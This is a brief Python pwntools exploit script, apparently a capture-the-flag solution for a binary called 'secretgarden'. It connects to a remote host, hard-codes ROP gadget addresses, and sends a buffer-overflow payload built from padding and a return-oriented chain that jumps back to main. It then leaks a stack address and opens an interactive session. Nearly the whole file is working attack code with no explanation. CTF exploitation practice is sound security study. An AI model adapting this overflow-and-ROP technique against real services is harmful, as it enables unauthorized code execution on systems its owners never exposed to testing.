#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *


#e = ELF('')
#l = ELF('')

context.arch = 'amd64'

#y = process( './secretgarden' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
#print util.proc.pidof(y)

host , port = '10.13.2.43' , 20739
#host , port = '192.168.78.141' , 4000
y = remote( host , port )

syscall = 0x400122
add_rsp_ret = 0x400110
out_write = 0x400103
pop_rdx = 0x4000ab
pppr = 0x4000a9 # pop rdi , pop rsi , pop rdx , ret
read = 0x40011f
bss = 0x600125
bss = 0x600125
pt = 0x4000de
stk = 0x7ffe4efa2618
pop_rax_ret = 0x400114
main = 0x400080
'''
    xor rax,rax
	syscall
	ret
'''

p = 'a' * 0x30
p += 'RBBBBBBP'
p += flat(
    0x4000aa,
    0x100,
    0x100,
    0x400108,
    main
    
)
p += 'a' * ( 0x80 - len(p) - 8 )
p += p64( main )


print hex( len( p ) )

y.sendafter( '?' , p )
y.recvuntil('a' * 24)

stk = u64( y.recv(6).ljust( 8 , '\x00' ) )
log.success( 'stack -> {}'.format( hex( stk ) ) )




y.interactive()